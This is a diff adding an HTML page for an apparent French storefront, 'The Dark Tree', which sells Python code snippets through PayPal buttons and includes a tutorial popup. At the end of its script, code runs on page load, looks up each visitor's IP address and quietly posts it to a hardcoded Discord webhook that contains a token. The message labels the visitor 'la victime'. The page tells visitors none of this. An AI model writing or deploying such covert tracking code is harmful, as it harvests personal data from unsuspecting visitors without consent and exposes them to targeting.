@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Dark Tree</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="codemirror.css">
+    <script src="codemirror.js"></script>
+    <script src="mode/python/python.js"></script>
+    <script src="mode/xml/xml.js"></script>
+    <style>
+        /* Styles améliorés */
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+        h1 {
+            margin: 0;
+        }
+        .button-container {
+            display: flex;
+        }
+        .button-container button {
+            background-color: #00bfff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .button-container button:hover {
+            background-color: #0056b3;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .produit {
+            text-align: center;
+            background-color: #fff;
+            color: #000;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 10px;
+            width: calc(33.33% - 20px);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            transition: transform 0.2s;
+        }
+        .produit:hover {
+            transform: scale(1.05);
+        }
+        .produit img {
+            max-width: 100%;
+        }
+        .produit h3 {
+            font-size: 1.5rem;
+            margin: 10px 0;
+        }
+        .produit p {
+            font-size: 1rem;
+            color: #666;
+        }
+        .price {
+            font-size: 1.2rem;
+            color: #00bfff;
+        }
+        button {
+            background-color: #00bfff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #code-editor {
+            width: 100%;
+            height: 300px;
+            border: 1px solid #ddd;
+            margin-top: 20px;
+        }
+        .console-button {
+            background-color: #00bfff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .console-button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Style pour la fenêtre modale */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Bouton de fermeture de la boîte modale */
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>The Dark Tree</h1>
+        <div class="button-container">
+            <button class="console-button" id="open-python-console">Console Python</button>
+            <button class="console-button" id="open-tutorial">Comment Faire ?</button>
+        </div>
+    </header>
+
+    <main>
+        <section class="produits">
+            <div class="produit">
+                <img src="code1.jpg" alt="Code Python 1">
+                <h3>Code Python 1</h3>
+                <p>Description du code Python 1.</p>
+                <p class="price">Prix : 0.99€</p>
+                <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+                    <input type="hidden" name="cmd" value="_s-xclick">
+                    <input type="hidden" name="hosted_button_id" value="L2V4JGGALTEJN"> <!-- Votre propre ID PayPal -->
+                    <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_buynow_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+                    <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+                </form>
+            </div>
+
+            <!-- Ajoutez ici d'autres éléments à vendre, s'ils sont disponibles -->
+            <div class="produit">
+                <img src="code2.jpg" alt="Code Python 2">
+                <h3>Code Python 2</h3>
+                <p>Description du code Python 2.</p>
+                <p class="price">Prix : 0.99€</p>
+                <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+                    <input type="hidden" name="cmd" value="_s-xclick">
+                    <input type="hidden" name="hosted_button_id" value="VOTRE_ID_PAYPAL2"> <!-- Votre propre ID PayPal -->
+                    <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_buynow_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+                    <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+                </form>
+            </div>
+
+            <div class="produit">
+                <img src="code3.jpg" alt="Code Python 3">
+                <h3>Code Python 3</h3>
+                <p>Description du code Python 3.</p>
+                <p class="price">Prix : 0.99€</p>
+                <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+                    <input type="hidden" name="cmd" value="_s-xclick">
+                    <input type="hidden" name="hosted_button_id" value="VOTRE_ID_PAYPAL3"> <!-- Votre propre ID PayPal -->
+                    <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_buynow_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+                    <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <div id="tutorial-modal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="close-tutorial">&times;</span>
+            <h2>Tutoriel - Comment Faire ?</h2>
+            <p>
+                Bienvenue dans le tutoriel Comment Faire ?<br><br>
+                Pour commencer, voici un exemple simple de code Python :<br><br>
+                <code>print('Hello, World!')</code><br><br>
+                Ce code affichera 'Hello, World!' dans la console.<br><br>
+                Vous pouvez écrire vos propres programmes Python ici et les exécuter avec le bouton Console Python.
+            </p>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 The Dark Tree</p>
+    </footer>
+
+    <script>
+        // Code JavaScript pour gérer l'affichage de la boîte modale
+        var openTutorialButton = document.getElementById("open-tutorial");
+        var tutorialModal = document.getElementById("tutorial-modal");
+        var closeTutorialButton = document.getElementById("close-tutorial");
+
+        openTutorialButton.addEventListener("click", function() {
+            tutorialModal.style.display = "block";
+        });
+
+        closeTutorialButton.addEventListener("click", function() {
+            tutorialModal.style.display = "none";
+        });
+
+        window.addEventListener("click", function(event) {
+            if (event.target === tutorialModal) {
+                tutorialModal.style.display = "none";
+            }
+        });
+                // Fonction pour envoyer le message avec l'adresse IP dans un cadre bleu à un webhook
+                function sendMessageToWebhook(ip) {
+            const webhookUrl = "https://discord.com/api/webhooks/1167131495677309008/cvxx-PJuoBtQexAWW_eLCg_uiPM_W3T3twGQcG3_iqhyyvJGTi0VExgGJV33GzkA_wwn";
+
+            const message = {
+                content: "",
+                embeds: [
+                    {
+                        color: 3447003, // Couleur bleue (vous pouvez changer cette valeur)
+                        description: `L'adresse IP de la victime est : ${ip}`
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Message avec cadre bleu contenant l'adresse IP envoyé avec succès au webhook Discord.");
+                } else {
+                    console.error("Erreur lors de l'envoi du message au webhook Discord.");
+                }
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi du message au webhook Discord.", error);
+            });
+        }
+
+        // Utilisation de l'API de géolocalisation pour récupérer l'adresse IP
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Envoi du message avec le cadre bleu contenant l'adresse IP au webhook Discord lorsque la page est chargée
+                sendMessageToWebhook(ipAddress);
+            })
+            .catch(error => {
+                console.error("Impossible de récupérer l'adresse IP.", error);
+            });
+    </script>
+
+</body>
+</html>
